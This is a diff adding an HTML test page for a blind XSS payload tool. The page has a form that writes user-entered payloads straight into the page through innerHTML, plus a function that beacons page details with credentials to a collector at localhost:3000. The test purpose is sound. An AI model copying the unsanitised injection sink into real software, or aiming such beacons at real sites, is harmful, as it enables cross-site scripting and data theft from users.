@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Blind XSS Payload Test Page</title>
+</head>
+<body>
+    <h1>Blind XSS Payload Test</h1>
+    <p>This page tests the Blind XSS payload functionality.</p>
+    
+    <h2>Test Area</h2>
+    <div id="test-content">
+        <!-- Your payload will be injected here -->
+        <p>Normal content</p>
+    </div>
+    
+    <h2>Manual Injection Test</h2>
+    <form id="inject-form">
+        <label for="payload-input">Enter payload to test:</label><br>
+        <textarea id="payload-input" rows="4" cols="50"></textarea><br>
+        <button type="button" onclick="injectPayload()">Inject Payload</button>
+    </form>
+    
+    <h2>Direct Payload Test</h2>
+    <button onclick="testDirectPayload()">Test Direct Payload</button>
+    
+    <h2>Results</h2>
+    <div id="results">
+        <p>Check your Blind XSS tool at <a href="http://localhost:3000" target="_blank">http://localhost:3000</a> for results.</p>
+        <p id="status">Status: Waiting for test...</p>
+    </div>
+    
+    <script>
+        function injectPayload() {
+            const payload = document.getElementById('payload-input').value;
+            const testContent = document.getElementById('test-content');
+            
+            // Clear previous content
+            testContent.innerHTML = '<p>Normal content</p>';
+            
+            // Inject the payload
+            testContent.innerHTML += payload;
+            
+            document.getElementById('status').innerHTML = 'Status: Payload injected manually';
+            console.log('Payload injected:', payload);
+        }
+        
+        function testDirectPayload() {
+            // This is the payload we generated earlier - simplified version
+            try {
+                // Create a simple test payload that sends data to our server
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'http://localhost:3000/api/reports', true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.withCredentials = true;
+                
+                var testData = {
+                    url: window.location.href,
+                    userAgent: navigator.userAgent,
+                    referer: document.referrer,
+                    origin: window.location.origin,
+                    timestamp: new Date().toISOString(),
+                    pageTitle: document.title,
+                    testPayload: true
+                };
+                
+                xhr.send(JSON.stringify(testData));
+                document.getElementById('status').innerHTML = 'Status: Direct payload executed - check your tool';
+            } catch (e) {
+                document.getElementById('status').innerHTML = 'Status: Error executing direct payload - ' + e.message;
+                console.error('Error executing direct payload:', e);
+            }
+        }
+    </script>
+</body>
+</html>
